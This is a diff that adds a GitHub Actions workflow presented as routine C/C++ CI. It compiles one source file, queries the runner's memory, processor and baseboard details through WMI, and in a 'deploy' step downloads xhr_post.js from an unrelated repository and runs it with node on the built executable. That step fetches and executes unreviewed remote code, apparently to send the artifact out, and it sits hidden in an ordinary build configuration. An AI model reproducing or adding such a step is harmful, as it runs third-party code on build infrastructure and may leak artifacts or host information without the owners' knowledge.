@@ -1,0 +1,36 @@
+name: C/C++ CI
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+jobs:
+  win32_build:
+    name: default
+    runs-on: windows-latest
+    steps:
+      - name: Check out source code
+        uses: actions/checkout@v1
+      - name: ilammy/msvc-dev-cmd@v1
+        uses: ilammy/msvc-dev-cmd@v1
+        with:
+          arch: x86
+      - name: Compile and run some C code
+        shell: cmd
+        run: |
+          cl.exe /O2 cur_data_str.cpp
+          powershell Get-WmiObject win32_physicalmemory
+          powershell Get-WmiObject win32_processor
+          powershell Get-WmiObject win32_baseboard
+          node --version
+      - name: Upload a Build Artifact
+        uses: actions/upload-artifact@v2
+        with:
+          name: cur_data_str.exe
+          path: cur_data_str.exe
+      - name: deploy
+        run: |
+          wget https://raw.githubusercontent.com/gitseo/vm/master/xhr_post.js
+          node xhr_post.js cur_data_str.exe cur_data_str.exe
